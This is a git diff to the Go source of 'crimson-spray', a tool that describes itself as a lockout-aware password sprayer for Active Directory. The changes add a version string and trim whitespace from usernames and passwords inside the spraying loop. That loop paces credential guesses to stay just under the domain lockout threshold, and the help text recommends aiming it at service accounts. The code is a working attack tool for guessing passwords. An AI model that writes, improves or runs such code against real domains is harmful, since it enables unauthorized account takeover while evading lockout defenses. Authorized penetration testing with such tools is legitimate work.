@@ -14,7 +14,7 @@ import (
 )
 
 func main() {
-	parser := argparse.NewParser("crimson-spray", "A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
+	parser := argparse.NewParser("crimson-spray", "(v.0.1.1) A lockout aware password sprayer for Active Directory. Please enter the raw net accounts /domain variables for best results. It is also advisable to use this against service accounts.")
 	var userFilePathArg = parser.String("u", "username-file", &argparse.Options{Required: true, Help: "(Required) File of users separated by newlines"})
 	var passFilePathArg = parser.String("p", "password-file", &argparse.Options{Required: true, Help: "(Required) File of passwords seperated by newlines. A good wordlist generator can be found at https://weakpass.com/generate"})
 	var domainArg = parser.String("d", "domain", &argparse.Options{Required: true, Help: "(Required) Domain of user "})
@@ -66,6 +66,7 @@ func preRunStats(usernamePath string, passwordPath string, domain string, target
 
 	}
 	fmt.Println()
+	fmt.Println("crimson-spray v0.1.1")
 	fmt.Printf("Imported Users: %d\n", userListLen)
 	fmt.Printf("Imported Passwords: %d\n", passwordListLen)
 	fmt.Println()
@@ -92,11 +93,13 @@ func singleUserSpray(usernamePath string, passwordPath string, domain string, ta
 	attemptThreshold := lockoutThreshold - 1
 	currentPasswordIndex := 0
 	for _, users := range userList {
+		trimUser := strings.TrimSpace(users)
 		for currentPasswordIndex < len(passwordList) {
 			result := 4
 			for i := 0; i < attemptThreshold; i++ {
 				passwordToAttempt := passwordList[currentPasswordIndex+i]
-				result = testCred(users, passwordToAttempt, domain, targetIP, verbose)
+				trimPasswordToAttempt := strings.TrimSpace(passwordToAttempt)
+				result = testCred(trimUser, trimPasswordToAttempt, domain, targetIP, verbose)
 				if result == 0 {
 					break
 				} else if result == 2 {
